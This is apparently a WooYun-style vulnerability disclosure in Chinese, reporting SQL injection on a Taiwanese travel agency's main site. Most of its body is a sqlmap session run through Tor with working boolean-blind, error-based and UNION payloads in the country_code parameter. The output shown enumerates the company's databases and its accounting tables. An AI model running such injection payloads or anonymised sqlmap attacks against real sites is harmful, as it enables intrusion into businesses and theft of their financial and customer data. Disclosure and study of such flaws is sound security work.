wybug_title: 喜鴻旅行社主站SQL注入漏洞（臺灣地區）
wybug_status: 已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-27：	细节已通知厂商并且等待厂商处理中									2015-12-28：	厂商已经确认，细节仅向厂商公开									2016-01-07：	细节向核心白帽子及相关领域专家公开									2016-01-17：	细节向普通白帽子公开									2016-01-27：	细节向实习白帽子公开									2016-02-09：	细节向公众公开  简要描述： 喜鴻旅行社主站SQL注入 详细说明：  喜鴻旅行社主站SQL注入
http://**.**.**.**
   漏洞证明：  
$ ./sqlmap.py --tor --tor-type=SOCKS5 --random-agent --time-sec=20 --technique=BEUS --union-char=N --answers="extending=N,skip=Y,follow=N,quite=Y" -u "http://**.**.**.**/web/ThemeTravel/golf/golf_introduction_area.asp?country_code=CHN&city_code=&view_id=VCHNCKG49"---Parameter: country_code (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: country_code=CHN' AND 7998=7998 AND 'CXkA'='CXkA&city_code=&view_id=VCHNCKG49    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: country_code=CHN' AND 5534=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (5534=5534) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113))) AND 'QbJw'='QbJw&city_code=&view_id=VCHNCKG49    Type: UNION query    Title: Generic UNION query (N) - 3 columns    Payload: country_code=CHN' UNION ALL SELECT 'N','N',CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(109)+CHAR(111)+CHAR(111)+CHAR(84)+CHAR(97)+CHAR(66)+CHAR(82)+CHAR(98)+CHAR(109)+CHAR(81)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)-- &city_code=&view_id=VCHNCKG49---web server operating system: Windows 8.1 or 2012 R2web application technology: ASP.NET, Microsoft IIS 8.5, ASPback-end DBMS: Microsoft SQL Server 2008available databases [8]:[*] homepage[*] Hsihung_accounting[*] Hsihung_travel[*] Hsihung_web[*] master[*] model[*] msdb[*] tempdb[07:32:46] [INFO] fetching tables for database: Hsihung_accounting  ==>非current_db也受影响[07:37:50] [WARNING] reflective value(s) found and filtering out[07:37:50] [INFO] the SQL query used returns 77 entries[07:45:23] [INFO] retrieved: dbo.account_2_live[07:54:27] [INFO] retrieved: dbo.account_2_live[08:03:47] [INFO] retrieved: dbo.account_2001[08:13:27] [INFO] retrieved: dbo.account_2005[08:22:44] [INFO] retrieved: dbo.accounts_8_month[08:31:16] [INFO] retrieved: dbo.accounts_8_month[08:40:09] [INFO] retrieved: dbo.balance_sheet_detail[08:48:42] [INFO] retrieved: dbo.balance_sheet_detail[08:58:30] [INFO] retrieved: dbo.basic_data[09:07:24] [INFO] retrieved: dbo.card_bank[09:15:52] [INFO] retrieved: dbo.card_rate[09:24:26] [INFO] retrieved: dbo.check_in_content[09:33:25] [INFO] retrieved: dbo.check_in_content[09:42:13] [INFO] retrieved: dbo.check_in_content[09:50:13] [INFO] retrieved: dbo.check_in_table[09:58:41] [INFO] retrieved: dbo.check_out_content[10:07:16] [INFO] retrieved: dbo.check_out_content[10:15:30] [INFO] retrieved: dbo.check_out_table
